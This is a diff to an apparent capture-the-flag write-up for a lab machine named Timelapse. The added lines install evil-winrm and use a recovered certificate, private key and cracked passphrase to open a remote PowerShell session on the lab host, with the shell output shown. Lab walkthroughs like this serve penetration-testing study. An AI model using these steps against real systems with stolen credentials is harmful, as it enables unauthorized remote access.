@@ -262,10 +262,37 @@ nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
 -----END CERTIFICATE-----
 ```
 
+<br> 
+
 Next I installed [evil-winrm](https://github.com/Hackplayers/evil-winrm) with
 
 ```
 sudo dnf remove ruby && sudo dnf install ruby-devel
 gem install evil-winrm
 ```
+
+Again enter thuglegacy as password:
+
+<br>
+
+```
+[connor@fedora timelapse]$ evil-winrm -S -k privkey -c cert -i 10.10.11.152
+
+Evil-WinRM shell v3.4
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
+timelapse\legacyy
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
+```
+
+<br>
+
+And we're in :)
+
+<br>
 
